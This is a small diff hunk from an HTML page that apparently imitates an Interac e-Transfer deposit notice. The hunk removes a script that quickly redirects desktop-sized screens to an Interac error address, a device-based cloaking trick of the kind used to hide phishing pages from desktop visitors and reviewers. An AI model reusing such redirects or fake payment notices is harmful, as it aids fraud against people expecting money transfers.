@@ -339,4 +339,4 @@ The funds will be processed and deposited in your account within the next 48 hou
         </div>
     
 
-</section></section></body><script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>
+</section></section></body></html>
